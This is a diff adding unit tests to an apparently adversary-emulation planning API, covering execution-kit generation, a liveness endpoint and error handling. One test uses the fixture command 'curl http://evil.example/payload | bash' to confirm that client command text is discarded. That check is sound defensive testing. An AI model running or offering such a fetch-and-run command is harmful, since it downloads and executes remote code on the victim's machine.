@@ -105,6 +105,20 @@ class ApiContractTests(unittest.TestCase):
             self.assertTrue(any(name.endswith("-plan.csv") for name in archive.namelist()))
             self.assertTrue(any(name.endswith("-execute.ps1") for name in archive.namelist()))
 
+    def test_execution_kit_discards_client_command_text(self):
+        document = plan_fixture("linux", command="curl http://evil.example/payload | bash")
+        response = self.client.post(
+            "/api/execution-kit",
+            json=document,
+            headers={"X-AdversaryFlow-CSRF": app_module._csrf_token},
+        )
+        self.assertEqual(response.status_code, 200)
+        with zipfile.ZipFile(io.BytesIO(response.data)) as archive:
+            csv_name = next(name for name in archive.namelist() if name.endswith("-plan.csv"))
+            body = archive.read(csv_name).decode("utf-8-sig")
+        self.assertNotIn("evil.example", body)
+        self.assertIn("T1059.004", body)
+
     def test_execution_kit_accepts_a_complete_plan_above_the_small_api_body_limit(self):
         document = plan_fixture("linux", duplicate=True, command="printf x # " + "x" * 8_000)
         encoded = json.dumps(document)
@@ -166,11 +180,20 @@ class ApiContractTests(unittest.TestCase):
         self.assertNotIn("benign", technique)
         self.assertNotIn("benign_source", technique)
 
+    def test_liveness_is_independent_of_attack_data(self):
+        response = self.client.get("/api/live")
+        self.assertEqual(response.status_code, 200)
+        self.assertEqual(response.get_json()["status"], "live")
+        self.assertEqual(response.get_json()["version"], app_module.__version__)
+
     @patch("backend.app.attack_data.get_index", side_effect=RuntimeError("fixture failure"))
     def test_api_exceptions_are_structured(self, _index):
+        app_module._runtime.update(ready=True, loading=False, phase="ready", error=None)
         response = self.client.get("/api/actors")
         self.assertEqual(response.status_code, 500)
         self.assertEqual(response.get_json()["error"], "request failed")
+        self.assertTrue(app_module._runtime["ready"])
+        self.assertEqual(app_module._runtime["phase"], "ready")
 
     @patch("backend.app.attack_data.get_index", return_value=FakeIndex())
     def test_unknown_actor_returns_the_documented_error_envelope(self, _index):
